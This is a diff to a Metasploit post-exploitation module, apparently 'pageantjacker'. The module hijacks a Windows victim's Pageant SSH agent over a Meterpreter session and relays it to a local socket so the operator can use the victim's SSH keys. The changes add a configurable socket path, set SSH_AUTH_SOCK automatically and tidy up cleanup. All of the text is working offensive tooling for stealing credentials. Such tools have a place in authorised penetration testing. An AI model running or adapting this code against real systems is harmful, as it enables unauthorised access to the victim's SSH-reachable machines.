@@ -22,12 +22,14 @@ class Metasploit3 < Msf::Post
         'Platform'      => [ 'win' ],
         'SessionTypes'  => [ 'meterpreter' ]
       ))
-    #register_options(
-    #  [
-    #  ], self.class)
+    register_options(
+      [
+        OptString.new('SOCKETPATH', [false, 'Specify a filename for the local UNIX socket.', nil]),
+      ], self.class)
   end
 
   def run
+
 
     ## load incognito
     if(!session.pageantjacker)
@@ -40,7 +42,12 @@ class Metasploit3 < Msf::Post
       return false
     end
 
-    @sockpath = "#{::Dir::Tmpname.tmpdir}/#{::Dir::Tmpname.make_tmpname('pageantjacker', 5)}"
+    if datastore['SocketPath']
+        @sockpath = datastore['SocketPath'].to_s
+    else
+        @sockpath = "#{::Dir::Tmpname.tmpdir}/#{::Dir::Tmpname.make_tmpname('pageantjacker', 5)}"
+    end
+
     if ::File.exists?(@sockpath)
         print_error("Your requested socket (#{@sockpath}) already exists. Remove it or choose another path and try again.")
         return false
@@ -50,7 +57,9 @@ class Metasploit3 < Msf::Post
       print_status("Launched listening socket on #{@sockpath}.")
       print_status("Set SSH_AUTH_SOCK variable to #{@sockpath} (e.g. export SSH_AUTH_SOCK=\"#{@sockpath}\")")
       print_status("Now use any tool normally (e.g. ssh-add)")
-    
+
+      print_status("Setting SSH_AUTH_SOCK to #{@sockpath}")
+      ENV['SSH_AUTH_SOCK'] = @sockpath 
       loop { 
         s = serv.accept
         loop {
@@ -65,11 +74,11 @@ class Metasploit3 < Msf::Post
   end
 
   def cleanup
-
-    if ::File.exists?(@sockpath)
-        ::File.delete(@sockpath)
+    if @sockpath
+        if ::File.exists?(@sockpath)
+            ::File.delete(@sockpath)
+        end
     end
-
   end
 
 end
